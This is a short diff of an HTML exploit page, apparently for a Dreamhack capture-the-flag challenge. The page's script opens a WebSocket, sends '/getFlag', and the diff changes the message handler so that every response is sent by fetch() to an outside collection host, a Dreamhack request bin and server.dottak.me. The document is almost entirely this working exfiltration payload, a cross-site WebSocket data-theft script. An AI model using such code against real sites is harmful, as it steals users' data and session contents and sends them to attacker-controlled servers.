@@ -13,9 +13,10 @@
         ws.send(JSON.stringify({ message: '/getFlag' }));
       };
       ws.onmessage = (event) => {
-        if (event.data.includes('Flag:')) {
-          fetch('https://uwvmoap.request.dreamhack.games/?flag=' + encodeURIComponent(event.data));
-        }
+        fetch('https://uwvmoap.request.dreamhack.games/?flag=' + encodeURIComponent(event.data));
+        fetch('https://server.dottak.me/?flag=' + encodeURIComponent(event.data));
+        // if (event.data.includes('Flag:')) {
+        // }
       };
     </script>
 </body>
